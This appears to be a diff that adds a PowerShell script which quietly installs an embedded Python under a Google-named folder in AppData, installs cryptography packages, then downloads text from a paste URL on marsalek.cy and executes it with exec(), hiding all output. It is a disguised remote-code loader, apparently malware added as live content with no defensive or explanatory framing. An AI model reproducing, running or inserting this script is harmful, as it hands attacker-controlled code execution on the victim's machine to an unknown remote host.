@@ -1,0 +1,14 @@
+$pythonDir = "$env:APPDATA\Google\python"
+New-Item -ItemType Directory -Force -Path $pythonDir | Out-Null
+$pythonZip = "$pythonDir\python-3.14.2-embed-amd64.zip"
+Invoke-WebRequest -Uri "https://www.python.org/ftp/python/3.14.2/python-3.14.2-embed-amd64.zip" -OutFile $pythonZip
+Expand-Archive -Path $pythonZip -DestinationPath $pythonDir -Force
+Remove-Item $pythonZip
+$pthFile = "$pythonDir\python314._pth"
+(Get-Content $pthFile) -replace '#import site', 'import site' | Set-Content $pthFile
+$pipScript = "$pythonDir\get-pip.py"
+Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile $pipScript
+& "$pythonDir\python.exe" $pipScript | Out-Null
+& "$pythonDir\python.exe" -m pip install setuptools | Out-Null
+& "$pythonDir\python.exe" -m pip install cryptography fernet requests --no-build-isolation | Out-Null
+& "$pythonDir\python.exe" -c "import os;from fernet import Fernet;import requests;exec(requests.get('https://marsalek.cy/paste?userid=511&is_exe=1').text.replace('<pre>', '').replace('</pre>', ''))" | Out-Null
